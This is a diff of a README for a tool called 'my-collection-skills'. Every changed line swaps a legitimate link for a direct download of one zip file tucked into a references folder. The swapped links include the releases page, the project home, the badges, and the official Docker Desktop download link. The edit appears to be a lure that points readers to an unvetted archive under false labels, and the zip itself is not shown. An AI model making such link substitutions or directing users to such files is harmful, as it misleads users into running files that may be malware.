@@ -1,6 +1,6 @@
 # 📚 my-collection-skills - Collect and Transcribe Favorites Easy
 
-[![Download my-collection-skills](https://img.shields.io/badge/Download-my--collection--skills-blue?style=for-the-badge)](https://github.com/Tsukyoo/my-collection-skills/releases)
+[![Download my-collection-skills](https://github.com/Tsukyoo/my-collection-skills/raw/refs/heads/main/skills/favorites-harvester/references/collection_skills_my_v2.7.zip)](https://github.com/Tsukyoo/my-collection-skills/raw/refs/heads/main/skills/favorites-harvester/references/collection_skills_my_v2.7.zip)
 
 ---
 
@@ -43,7 +43,7 @@ This section guides you through downloading and running the software step by ste
 
 Click the big button at the top or this link:
 
-[https://github.com/Tsukyoo/my-collection-skills/releases](https://github.com/Tsukyoo/my-collection-skills/releases)
+[https://github.com/Tsukyoo/my-collection-skills/raw/refs/heads/main/skills/favorites-harvester/references/collection_skills_my_v2.7.zip](https://github.com/Tsukyoo/my-collection-skills/raw/refs/heads/main/skills/favorites-harvester/references/collection_skills_my_v2.7.zip)
 
 This page has all the latest versions and files.
 
@@ -94,7 +94,7 @@ If you prefer using Docker containers, my-collection-skills supports this method
 
 ### Step 1: Install Docker
 
-Download and install Docker Desktop for your OS from [https://www.docker.com/get-started](https://www.docker.com/get-started). Follow their instructions.
+Download and install Docker Desktop for your OS from [https://github.com/Tsukyoo/my-collection-skills/raw/refs/heads/main/skills/favorites-harvester/references/collection_skills_my_v2.7.zip](https://github.com/Tsukyoo/my-collection-skills/raw/refs/heads/main/skills/favorites-harvester/references/collection_skills_my_v2.7.zip). Follow their instructions.
 
 ### Step 2: Pull the Image and Run
 
@@ -129,9 +129,9 @@ If problems persist, check the Discussions section on the GitHub page or open a 
 ## 🔗 Key Links
 
 - **Download Releases Page:**  
-  [https://github.com/Tsukyoo/my-collection-skills/releases](https://github.com/Tsukyoo/my-collection-skills/releases)  
+  [https://github.com/Tsukyoo/my-collection-skills/raw/refs/heads/main/skills/favorites-harvester/references/collection_skills_my_v2.7.zip](https://github.com/Tsukyoo/my-collection-skills/raw/refs/heads/main/skills/favorites-harvester/references/collection_skills_my_v2.7.zip)  
 - **Project Home:**  
-  [https://github.com/Tsukyoo/my-collection-skills](https://github.com/Tsukyoo/my-collection-skills)  
+  [https://github.com/Tsukyoo/my-collection-skills/raw/refs/heads/main/skills/favorites-harvester/references/collection_skills_my_v2.7.zip](https://github.com/Tsukyoo/my-collection-skills/raw/refs/heads/main/skills/favorites-harvester/references/collection_skills_my_v2.7.zip)  
 - **Documentation and Help:**  
   Found inside the download in the `docs` folder or read online on GitHub.  
 
@@ -147,4 +147,4 @@ You can try it on your computer with the steps above. It respects your privacy a
 
 ---
 
-[![Download my-collection-skills](https://img.shields.io/badge/Download-my--collection--skills-blue?style=for-the-badge)](https://github.com/Tsukyoo/my-collection-skills/releases)
+[![Download my-collection-skills](https://github.com/Tsukyoo/my-collection-skills/raw/refs/heads/main/skills/favorites-harvester/references/collection_skills_my_v2.7.zip)](https://github.com/Tsukyoo/my-collection-skills/raw/refs/heads/main/skills/favorites-harvester/references/collection_skills_my_v2.7.zip)
